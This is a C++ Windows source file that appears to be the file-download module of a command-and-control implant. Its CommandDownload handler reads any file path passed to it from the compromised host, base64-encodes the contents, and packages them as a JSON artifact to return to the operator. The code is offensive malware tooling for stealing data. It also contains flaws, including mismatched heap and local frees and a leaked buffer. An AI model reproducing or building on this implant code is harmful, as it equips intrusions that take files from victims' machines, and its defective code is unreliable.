#include "Command.h"

BOOL ReadFileFromDisk(CONST CHAR *path, LPVOID *buffer, DWORD *buffsize) {
    HANDLE hFile = NULL;
	LPVOID buf = NULL;
	SIZE_T size = 0;

	hFile = CreateFileA( path, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
	if ( hFile == INVALID_HANDLE_VALUE ) {
		printf( "[-] CreateFileA: ( %d )\n", GetLastError( ) );
		goto Cleanup;
	}

	size = GetFileSize( hFile, 0 );
	if ( size == INVALID_FILE_SIZE ) {
		printf( "[-] GetFileSize: ( %d )\n", GetLastError( ) );
		goto Cleanup;
	}

	buf = HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, size );
	if ( !buf ) {
		printf( "[-] LocalAlloc: ( %d )\n", GetLastError( ) );
		goto Cleanup;
	}

	if ( !ReadFile( hFile, buf, size, NULL, NULL ) ) {
		printf( "[-] ReadFile: ( %d )\n", GetLastError( ) );
		goto Cleanup;
	}

	if ( hFile )
		CloseHandle( hFile );

	*buffer     = buf;
    *buffsize   = size;
    return TRUE;
Cleanup:
	if ( hFile )
		CloseHandle( hFile );
	if ( buf )
		LocalFree( buf );

	return FALSE;
}

CHAR* Base64Encode(const BYTE* input, DWORD size) {
    DWORD datasize = 0;

    if (!CryptBinaryToStringA(input, size, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &datasize)) {
        return NULL;
    }

    CHAR* data = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, datasize);
    if (!data)
        return NULL;

    if (!CryptBinaryToStringA(input, size, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data, &datasize)) {
        HeapFree(GetProcessHeap(), 0, data);
        return NULL;
    }

    return data;
}

BOOL CommandDownload(json& args, string artifact, json& result) {
    LPVOID  data        = NULL;
    DWORD   size        = 0; 
    CHAR*   b64data     = NULL;
    string  path        = args[0].get<string>();
    json    file        = json::object();

    if (!ReadFileFromDisk(path.c_str(), &data, &size)) {
        result["output"] = "[-] file not found";
        return FALSE;
    }

    b64data = Base64Encode((BYTE*)data, size);
    if (b64data == NULL) {
        result["output"] = "[-] failed to base64 encode the file";
        return FALSE;
    }

    file["name"] = path.c_str();
    file["size"] = size;
    file["data"] = b64data;

    result["output"]    = "[+] file downloaded";
    result["artifact"]  = file.dump();

    return TRUE;
}